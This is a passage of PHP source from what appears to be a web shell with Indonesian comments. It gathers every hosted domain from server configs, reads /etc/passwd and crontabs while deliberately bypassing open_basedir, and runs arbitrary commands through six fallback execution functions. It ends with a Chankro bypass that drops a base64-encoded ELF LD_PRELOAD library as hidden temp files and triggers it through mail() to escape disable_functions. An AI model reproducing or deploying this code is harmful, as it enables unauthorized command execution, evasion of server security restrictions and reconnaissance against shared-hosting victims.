        $targetFiles = array(
            '/etc/named.conf',
            '/etc/userdomains',
            '/etc/trueuserdomains',
            '/etc/localdomains',
            '/etc/httpd/conf/httpd.conf',
            '/etc/apache2/apache2.conf',
            '/etc/nginx/nginx.conf',
            '/usr/local/apache/conf/httpd.conf',
            '/usr/local/apache2/conf/httpd.conf',
        );

        $readSuccess = false;

        // Layer 1: direct file read
        foreach ($targetFiles as $file) {
            if (@is_readable($file)) {
                $content = @file_get_contents($file);
                if ($content !== false) {
                    $readSuccess = true;
                    if (preg_match_all('/zone\s+"([^"]+)"/i', $content, $m))
                        foreach ($m[1] as $d) $doms[] = trim($d);
                    if (preg_match_all('/^([a-zA-Z0-9.-]+\.[a-zA-Z]{2,}):/m', $content, $m))
                        foreach ($m[1] as $d) $doms[] = trim($d);
                    if (preg_match_all('/(?:ServerName|ServerAlias|server_name)\s+([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/i', $content, $m))
                        foreach ($m[1] as $d) $doms[] = trim($d);
                }
            }
        }

        // Layer 2: shell command bypass (tidak peduli open_basedir)
        if (!$readSuccess && $canExec) {
            $cmdFiles = implode(' ', $targetFiles);
            $rawDomCmd = $lshRun("cat $cmdFiles 2>/dev/null");
            if ($rawDomCmd !== '') {
                $readSuccess = true;
                if (preg_match_all('/zone\s+"([^"]+)"/i', $rawDomCmd, $m))
                    foreach ($m[1] as $d) $doms[] = trim($d);
                if (preg_match_all('/^([a-zA-Z0-9.-]+\.[a-zA-Z]{2,}):/m', $rawDomCmd, $m))
                    foreach ($m[1] as $d) $doms[] = trim($d);
                if (preg_match_all('/(?:ServerName|ServerAlias|server_name)\s+([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/i', $rawDomCmd, $m))
                    foreach ($m[1] as $d) $doms[] = trim($d);
            }
            // cPanel: ls /etc/vhosts/ atau /var/cpanel/userdata
            if (empty($doms)) {
                $cpanelDoms = $lshRun('ls /etc/vhosts/ 2>/dev/null || ls /var/cpanel/userdata/ 2>/dev/null');
                if ($cpanelDoms !== '') {
                    $readSuccess = true;
                    foreach (explode("\n", $cpanelDoms) as $dl)
                        if (trim($dl)) $doms[] = trim($dl);
                }
            }
            // httpd/nginx -S or -T
            if (empty($doms)) {
                $vhostDump = $lshRun('httpd -S 2>/dev/null || apache2 -S 2>/dev/null || nginx -T 2>/dev/null');
                if ($vhostDump !== '') {
                    $readSuccess = true;
                    if (preg_match_all('/(?:namevirtualhost|server_name|servername)\s+([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/i', $vhostDump, $m))
                        foreach ($m[1] as $d) $doms[] = trim($d);
                }
            }
            // Grep dari semua conf di apache2/httpd
            if (empty($doms)) {
                $grepDoms = $lshRun('grep -rh "ServerName\|ServerAlias\|server_name" /etc/apache2/sites-enabled/ /etc/httpd/conf.d/ /etc/nginx/conf.d/ /etc/nginx/sites-enabled/ 2>/dev/null');
                if ($grepDoms !== '') {
                    $readSuccess = true;
                    if (preg_match_all('/(?:ServerName|ServerAlias|server_name)\s+([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/i', $grepDoms, $m))
                        foreach ($m[1] as $d) $doms[] = trim($d);
                }
            }
        }

        // Layer 3: HTTP_HOST dari request header sebagai last-resort
        if (!$readSuccess) {
            $httpHost = isset($_SERVER['HTTP_HOST']) ? preg_replace('/:\d+$/', '', $_SERVER['HTTP_HOST']) : '';
            if ($httpHost && preg_match('/[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/', $httpHost)) {
                $doms[] = $httpHost;
                $readSuccess = true;
            }
            if (isset($_SERVER['SERVER_NAME']) && $_SERVER['SERVER_NAME'] && $_SERVER['SERVER_NAME'] !== 'localhost') {
                $doms[] = $_SERVER['SERVER_NAME'];
                $readSuccess = true;
            }
        }

        if ($readSuccess) {
            $cleanDoms = array();
            foreach ($doms as $zd) {
                $zd = strtolower(trim($zd));
                if ($zd && !preg_match('/\.in-addr\.arpa$|^localhost$|^localdomain$|^\*$/i', $zd) && !in_array($zd, $cleanDoms)) {
                    $cleanDoms[] = $zd;
                }
            }
            sort($cleanDoms);
            $info['domains'] = !empty($cleanDoms) ? implode(', ', $cleanDoms) : '(File terbaca, tapi zone tidak ditemukan)';
        } else {
            $info['domains'] = 'Akses ditolak semua';
        }

    }


    // Crontab
if (!$isWin) {
        // --- 1. Deteksi User Proses (Stealth & Akurat) ---
        $processUser = '';
        if (function_exists('posix_getuid') && function_exists('posix_getpwuid')) {
            $pw = @posix_getpwuid(@posix_getuid());
            if ($pw && isset($pw['name'])) $processUser = $pw['name'];
        }

        // Fallback: Parsing /proc/self/status murni PHP jika ekstensi posix diblokir
        if (empty($processUser)) {
            $status = @file_get_contents('/proc/self/status');
            if ($status && preg_match('/^Uid:\s+(\d+)/m', $status, $m)) {
                $uid = (int)$m[1];
                $passwd = @file_get_contents('/etc/passwd');
                if ($passwd) {
                    foreach (explode("\n", $passwd) as $line) {
                        $parts = explode(':', $line);
                        if (isset($parts[2]) && (int)$parts[2] === $uid) {
                            $processUser = $parts[0]; break;
                        }
                    }
                }
                // Fallback cmd jika /etc/passwd diblokir open_basedir
                if (empty($processUser) && $canExec) {
                    $idCmd = $lshRun('id -un');
                    if ($idCmd !== '') $processUser = $idCmd;
                }
            }
        }
        // Fallback: cmd whoami/id
        if (empty($processUser) && $canExec) {
            $whoami = $lshRun('whoami 2>/dev/null || id -un 2>/dev/null');
            if ($whoami !== '') $processUser = $whoami;
        }
        if (empty($processUser)) $processUser = get_current_user();

        // --- 2. System Crontab ---
        $info['cron_system'] = is_readable('/etc/crontab') ? trim(@file_get_contents('/etc/crontab')) : '(tidak dapat dibaca/tidak ada)';
        
        $cronD = '';
        if (is_dir('/etc/cron.d') && is_readable('/etc/cron.d')) {
            $cronFiles = @scandir('/etc/cron.d') ?: array();
            foreach ($cronFiles as $f) {
                if ($f === '.' || $f === '..') continue;
                $path = '/etc/cron.d/' . $f;
                if (is_file($path) && is_readable($path)) {
                    $c = @file_get_contents($path);
                    if ($c !== false && trim($c) !== '') $cronD .= "=== $f ===\n" . trim($c) . "\n\n";
                }
            }
        }
        $info['cron_d'] = trim($cronD) ?: '(kosong)';

        // --- 3. Cron Periodic (Hourly, Daily, Weekly, Monthly) ---
        foreach (array('hourly', 'daily', 'weekly', 'monthly') as $p) {
            $dir = '/etc/cron.' . $p;
            if (is_dir($dir) && is_readable($dir)) {
                $files = array_diff((array)@scandir($dir), array('.', '..'));
                $info['cron_' . $p] = !empty($files) ? implode(', ', $files) : '-';
            } else {
                $info['cron_' . $p] = '(direktori tidak dapat dibaca/tidak ada)';
            }
        }

// --- 4. User Crontab (Cross-Distribution & Open_Basedir Bypass) ---
        $cronUserContent = '';
        $cronUserPath = ''; 

        // Deteksi letak direktori spool crontab secara mutlak dan akurat
        // Kita mengecek eksistensi folder spool menggunakan shell untuk bypass larangan PHP
        $spoolDir = '';
        $candidateDirs = array(
            '/var/spool/cron/crontabs', // Debian, Ubuntu, Kali Linux
            '/var/spool/cron/tabs',     // SUSE, Arch Linux
            '/var/spool/cron'           // RHEL, CentOS, AlmaLinux, Fedora
        );

        foreach ($candidateDirs as $dir) {
            // Cek via shell (test -d) atau PHP murni jika shell tidak tersedia
            if (($canExec && $lshRun("test -d $dir && echo 1") === '1') || @is_dir($dir)) {
                $spoolDir = $dir;
                break;
            }
        }

        // Susun letak file fisik yang akurat sesuai user yang sedang berjalan
        if ($spoolDir !== '') {
            $cronUserPath = $spoolDir . '/' . $processUser;
        } else {
            $cronUserPath = '/var/spool/cron/' . $processUser . ' (Disembunyikan ketat oleh OS)';
        }

        // 1. Ambil isi crontab via eksekusi crontab -l (paling aman & presisi)
        if ($canExec) {
            $cmdOut = $lshRun('crontab -l 2>/dev/null');
            if ($cmdOut !== '' && stripos($cmdOut, 'no crontab for') === false) {
                $cronUserContent = $cmdOut;
            }
        }

        // 2. Fallback: Jika eksekusi crontab -l diblokir, paksa baca file fisiknya
        if (empty($cronUserContent) && $spoolDir !== '') {
            $targetFile = $spoolDir . '/' . $processUser;
            $r = @file_get_contents($targetFile);
            if ($r !== false && trim($r) !== '') {
                $cronUserContent = trim($r);
            } elseif (function_exists('curl_init')) {
                $_ch = @curl_init('file://' . $targetFile);
                if ($_ch) {
                    @curl_setopt($_ch, CURLOPT_RETURNTRANSFER, true);
                    @curl_setopt($_ch, CURLOPT_TIMEOUT, 2);
                    $_cr = @curl_exec($_ch);
                    @curl_close($_ch);
                    if ($_cr !== false && strlen(trim($_cr)) > 2) {
                        $cronUserContent = trim($_cr);
                    }
                }
            }
        }

        // Format hasil akhir
        if (empty($cronUserContent)) {
            $cronUserContent = "(Crontab kosong atau hak akses file ditolak sepenuhnya oleh sistem root)";
        }
        
        $info['cron_user'] = "[Letak File Fisik: " . $cronUserPath . "]\n\n" . $cronUserContent;
    
} else {
    $info['cron_user'] = '(Windows)'; $info['cron_system'] = '';
    $info['cron_d'] = ''; $info['cron_hourly'] = '';
    $info['cron_daily'] = ''; $info['cron_weekly'] = ''; $info['cron_monthly'] = '';
}

return $info;

}

// ── COMMAND EXECUTION (multi-engine fallback) ──────────────────
function lshExecCmd($cmd) {
    $out = '';
    if (function_exists('proc_open')) {
        $ds = array(0=>array('pipe','r'), 1=>array('pipe','w'), 2=>array('pipe','w'));
        $pr = @proc_open($cmd, $ds, $pipes);
        if (is_resource($pr)) {
            @fclose($pipes[0]);
            $out = @stream_get_contents($pipes[1]);
            $err = @stream_get_contents($pipes[2]);
            @fclose($pipes[1]); @fclose($pipes[2]);
            @proc_close($pr);
            if ($out === false || $out === '') $out = $err;
            return (string)$out;
        }
    }
    if (function_exists('exec')) {
        $lines = array();
        @exec($cmd . ' 2>&1', $lines);
        return implode("\n", $lines);
    }
    if (function_exists('shell_exec')) {
        $r = @shell_exec($cmd . ' 2>&1');
        if ($r !== null) return (string)$r;
    }
    if (function_exists('system')) {
        ob_start();
        @system($cmd . ' 2>&1');
        return ob_get_clean();
    }
    if (function_exists('passthru')) {
        ob_start();
        @passthru($cmd . ' 2>&1');
        return ob_get_clean();
    }
    if (function_exists('popen')) {
        $h = @popen($cmd . ' 2>&1', 'r');
        if ($h) { $r = ''; while (!feof($h)) $r .= fgets($h, 4096); @pclose($h); return $r; }
    }
    return '(Tidak ada exec engine yang tersedia)';
}

// ── RECURSIVE COPY DIR ────────────────────────────────────────
function lshCopyDir($src, $dst) {
    if (!is_dir($dst)) @mkdir($dst, 0755, true);
    $items = @scandir($src);
    if (!$items) return false;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $s = $src . DIRECTORY_SEPARATOR . $item;
        $d = $dst . DIRECTORY_SEPARATOR . $item;
        if (is_dir($s)) lshCopyDir($s, $d);
        else @copy($s, $d);
    }
    return true;
}

function lshDeleteRecursive($path) {
    if (is_dir($path)) {
        $items = @scandir($path) ?: array();
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            lshDeleteRecursive($path . DIRECTORY_SEPARATOR . $item);
        }
        @rmdir($path);
    } else {
        @unlink($path);
    }
}

// ── CHANKRO EXECUTOR (PHP 5.3 – PHP 8.x+) ─────────────
function runChankroByp($command, $dir) {
    // ELF shared object (x86_64 Linux, Chankro hook, hardcoded)
    static $HOOK_B64 = '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BwAAAAwAAAAAAAAAAAAAAEiD7AhIiwW9CCAASIXAdAL/0EiDxAjDAP810gggAP8l1AggAA8fQAD/JdIIIABoAAAAAOng/////yXKCCAAaAEAAADp0P////8lwgggAGgCAAAA6cD/////JboIIABoAwAAAOmw/////yWyCCAAaAQAAADpoP////8lqgggAGgFAAAA6ZD/////JaIIIABoBgAAAOmA/////yWaCCAAaAcAAADpcP////8lkgggAGgIAAAA6WD/////JSIIIABmkAAAAAAAAAAASI09gQggAEiNBYEIIABVSCn4SInlSIP4DnYVSIsF1gcgAEiFwHQJXf/gZg8fRAAAXcMPH0AAZi4PH4QAAAAAAEiNPUEIIABIjTU6CCAAVUgp/kiJ5UjB/gNIifBIweg/SAHGSNH+dBhIiwWhByAASIXAdAxd/+BmDx+EAAAAAABdww8fQABmLg8fhAAAAAAAgD3xByAAAHUnSIM9dwcgAABVSInldAxIiz3SByAA6D3////oSP///13GBcgHIAAB88MPH0AAZi4PH4QAAAAAAEiNPVkFIABIgz8AdQvpXv///2YPH0QAAEiLBRkHIABIhcB06VVIieX/0F3pQP///1VIieVIjT16AAAA6FD+//++/wEAAEiJx+iT/v//SI09YQAAAOg3/v//SInH6E/+//+QXcNVSInlvgEAAAC/AQAAAOhZ/v//6JT+//+FwHQKvwAAAADodv7//5Bdw1VIieVIjT0lAAAA6FP+///o/v3//+gZ/v//kF3DAABIg+wISIPECMNDSEFOS1JPAExEX1BSRUxPQUQAARsDOzQAAAAFAAAAuP3//1AAAABY/v//eAAAAGj///+QAAAAnP///7AAAADF////0AAAAAAAAAAUAAAAAAAAAAF6UgABeBABGwwHCJABAAAkAAAAHAAAAGD9//+gAAAAAA4QRg4YSg8LdwiAAD8aOyozJCIAAAAAFAAAAEQAAADY/f//CAAAAAAAAAAAAAAAHAAAAFwAAADQ/v//NAAAAABBDhCGAkMNBm8MBwgAAAAcAAAAfAAAAOT+//8pAAAAAEEOEIYCQw0GZAwHCAAAABwAAACcAAAA7f7//x0AAAAAQQ4QhgJDDQZYDAcIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsAgAAAAAAAAAAAAAAAAAAHAIAAAAAAAAAAAAAAAAAAABAAAAAAAAALsAAAAAAAAADAAAAAAAAAAYBwAAAAAAAA0AAAAAAAAAXAkAAAAAAAAZAAAAAAAAAPgNIAAAAAAAGwAAAAAAAAAQAAAAAAAAABoAAAAAAAAACA4gAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7/bwAAAADwAQAAAAAAAAUAAAAAAAAAMAQAAAAAAAAGAAAAAAAAADgCAAAAAAAACgAAAAAAAADpAAAAAAAAAAsAAAAAAAAAGAAAAAAAAAADAAAAAAAAAAAQIAAAAAAAAgAAAAAAAADYAAAAAAAAABQAAAAAAAAABwAAAAAAAAAXAAAAAAAAAEAGAAAAAAAABwAAAAAAAABoBQAAAAAAAAgAAAAAAAAA2AAAAAAAAAAJAAAAAAAAABgAAAAAAAAA/v//bwAAAABIBQAAAAAAAP///28AAAAAAQAAAAAAAADw//9vAAAAABoFAAAAAAAA+f//bwAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgOIAAAAAAAAAAAAAAAAAAAAAAAAAAAAEYHAAAAAAAAVgcAAAAAAABmBwAAAAAAAHYHAAAAAAAAhgcAAAAAAACWBwAAAAAAAKYHAAAAAAAAtgcAAAAAAADGBwAAAAAAAGAQIAAAAAAAR0NDOiAoRGViaWFuIDYuMy4wLTE4K2RlYjl1MSkgNi4zLjAgMjAxNzA1MTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAQDIAQAAAAAAAAAAAAAAAAAAAAAAAAMAAgDwAQAAAAAAAAAAAAAAAAAAAAAAAAMAAwA4AgAAAAAAAAAAAAAAAAAAAAAAAAMABAAwBAAAAAAAAAAAAAAAAAAAAAAAAAMABQAaBQAAAAAAAAAAAAAAAAAAAAAAAAMABgBIBQAAAAAAAAAAAAAAAAAAAAAAAAMABwBoBQAAAAAAAAAAAAAAAAAAAAAAAAMACABABgAAAAAAAAAAAAAAAAAAAAAAAAMACQAYBwAAAAAAAAAAAAAAAAAAAAAAAAMACgAwBwAAAAAAAAAAAAAAAAAAAAAAAAMACwDQBwAAAAAAAAAAAAAAAAAAAAAAAAMADADgBwAAAAAAAAAAAAAAAAAAAAAAAAMADQBcCQAAAAAAAAAAAAAAAAAAAAAAAAMADgBlCQAAAAAAAAAAAAAAAAAAAAAAAAMADwB4CQAAAAAAAAAAAAAAAAAAAAAAAAMAEACwCQAAAAAAAAAAAAAAAAAAAAAAAAMAEQD4DSAAAAAAAAAAAAAAAAAAAAAAAAMAEgAIDiAAAAAAAAAAAAAAAAAAAAAAAAMAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAMAFAAYDiAAAAAAAAAAAAAAAAAAAAAAAAMAFQDYDyAAAAAAAAAAAAAAAAAAAAAAAAMAFgAAECAAAAAAAAAAAAAAAAAAAAAAAAMAFwBgECAAAAAAAAAAAAAAAAAAAAAAAAMAGABoECAAAAAAAAAAAAAAAAAAAAAAAAMAGQAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAADAAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAGQAAAAIADADgBwAAAAAAAAAAAAAAAAAAGwAAAAIADAAgCAAAAAAAAAAAAAAAAAAALgAAAAIADABwCAAAAAAAAAAAAAAAAAAARAAAAAEAGABoECAAAAAAAAEAAAAAAAAAUwAAAAEAEgAIDiAAAAAAAAAAAAAAAAAAegAAAAIADACwCAAAAAAAAAAAAAAAAAAAhgAAAAEAEQD4DSAAAAAAAAAAAAAAAAAApQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAArAAAAAEAEABoCgAAAAAAAAAAAAAAAAAAugAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAxgAAAAEAFwBgECAAAAAAAAAAAAAAAAAA0wAAAAEAFAAYDiAAAAAAAAAAAAAAAAAA3AAAAAAADwB4CQAAAAAAAAAAAAAAAAAA7wAAAAEAFwBoECAAAAAAAAAAAAAAAAAA+wAAAAEAFgAAECAAAAAAAAAAAAAAAAAAEQEAABIAAAAAAAAAAAAAAAAAAAAAAAAAJQEAACAAAAAAAAAAAAAAAAAAAAAAAAAAQQEAABAAFwBoECAAAAAAAAAAAAAAAAAASAEAABIADAAUCQAAAAAAACkAAAAAAAAAUgEAABIADQBcCQAAAAAAAAAAAAAAAAAAWAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAbAEAABIADADgCAAAAAAAADQAAAAAAAAAcAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAhAEAACAAAAAAAAAAAAAAAAAAAAAAAAAAkwEAABIADAA9CQAAAAAAAB0AAAAAAAAAnQEAABAAGABwECAAAAAAAAAAAAAAAAAAogEAABAAGABoECAAAAAAAAAAAAAAAAAArgEAABIAAAAAAAAAAAAAAAAAAAAAAAAAwQEAACAAAAAAAAAAAAAAAAAAAAAAAAAA1QEAABIAAAAAAAAAAAAAAAAAAAAAAAAA6wEAABIAAAAAAAAAAAAAAAAAAAAAAAAA/QEAACAAAAAAAAAAAAAAAAAAAAAAAAAAFwIAACIAAAAAAAAAAAAAAAAAAAAAAAAAMwIAABIACQAYBwAAAAAAAAAAAAAAAAAAOQIAABIAAAAAAAAAAAAAAAAAAAAAAAAAAGNydHN0dWZmLmMAX19KQ1JfTElTVF9fAGRlcmVnaXN0ZXJfdG1fY2xvbmVzAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eABjb21wbGV0ZWQuNjk3MgBfX2RvX2dsb2JhbF9kdG9yc19hdXhfZmluaV9hcnJheV9lbnRyeQBmcmFtZV9kdW1teQBfX2ZyYW1lX2R1bW15X2luaXRfYXJyYXlfZW50cnkAaG9vay5jAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kc29faGFuZGxlAF9EWU5BTUlDAF9fR05VX0VIX0ZSQU1FX0hEUgBfX1RNQ19FTkRfXwBfR0xPQkFMX09GRlNFVF9UQUJMRV8AZ2V0ZW52QEBHTElCQ18yLjIuNQBfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAX2VkYXRhAGRhZW1vbml6ZQBfZmluaQBzeXN0ZW1AQEdMSUJDXzIuMi41AHB3bgBzaWduYWxAQEdMSUJDXzIuMi41AF9fZ21vbl9zdGFydF9fAHByZWxvYWRtZQBfZW5kAF9fYnNzX3N0YXJ0AGNobW9kQEBHTElCQ18yLjIuNQBfSnZfUmVnaXN0ZXJDbGFzc2VzAHVuc2V0ZW52QEBHTElBQkNfMi4yLjUAX2V4aXRAQEdMSUJDXzIuMi41AF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAX19jeGFfZmluYWxpemVAQEdMSUJDXzIuMi41AF9pbml0AGZvcmtAQEdMSUJDXzIuMi41AA==';

    // Coba berbagai direktori writable jika $dir tidak writable
    $candidates = array(
        rtrim($dir, '/\\'),
        sys_get_temp_dir(),
        '/tmp',
        '/var/tmp',
        dirname($_SERVER['SCRIPT_FILENAME']),
    );
    $workDir = null;
    foreach ($candidates as $c) {
        if ($c && is_dir($c) && is_writable($c)) { $workDir = $c; break; }
    }
    if (!$workDir) {
        return array('ok' => false, 'out' => '', 'method' => 'none',
            'msg' => 'Tidak ada direktori writable yang ditemukan untuk menulis file bypass.');
    }

    $uniq     = substr(md5(microtime(true) . getmypid() . rand()), 0, 10);
    $soFile   = $workDir . DIRECTORY_SEPARATOR . '.s_' . $uniq . '.so';
    $sockFile = $workDir . DIRECTORY_SEPARATOR . '.c_' . $uniq . '.sock';
    $outFile  = $workDir . DIRECTORY_SEPARATOR . '.o_' . $uniq . '.tmp';

    $cmdFull = 'cd ' . escapeshellarg($dir) . ' && ' . $command . ' > ' . $outFile . ' 2>&1';
    $encoded = base64_encode($cmdFull);

    if (@file_put_contents($soFile, base64_decode($HOOK_B64)) === false) {
        return array('ok' => false, 'out' => '', 'method' => 'none',
            'msg' => 'Gagal menulis shared object ke ' . $workDir);
    }
    @chmod($soFile, 0755);

    if (@file_put_contents($sockFile, base64_decode($encoded)) === false) {
        @unlink($soFile);
        return array('ok' => false, 'out' => '', 'method' => 'none',
            'msg' => 'Gagal menulis command socket.');
    }

    // Set LD_PRELOAD
    @putenv('CHANKRO=' . $sockFile);
    @putenv('LD_PRELOAD=' . $soFile);

    // Trigger: semua fungsi yang bisa memicu library load
    $triggered = false; $method = 'none';
    $triggers = array('mail', 'mb_send_mail', 'error_log', 'imap_mail');
    foreach ($triggers as $fn) {
        if (!function_exists($fn)) continue;
        switch ($fn) {
            case 'mail':        @mail('a','a','a','a');        break;
            case 'mb_send_mail':@mb_send_mail('a','a','a');   break;
            case 'error_log':   @error_log('a',1,'a@a.a');    break;
            case 'imap_mail':   @imap_mail('a','a','a');      break;
        }
        $triggered = true; $method = $fn;
        break;
    }

    @putenv('LD_PRELOAD');
    @putenv('CHANKRO');

    if (!$triggered) {
        @unlink($soFile); @unlink($sockFile);
        return array('ok' => false, 'out' => '', 'method' => 'none',
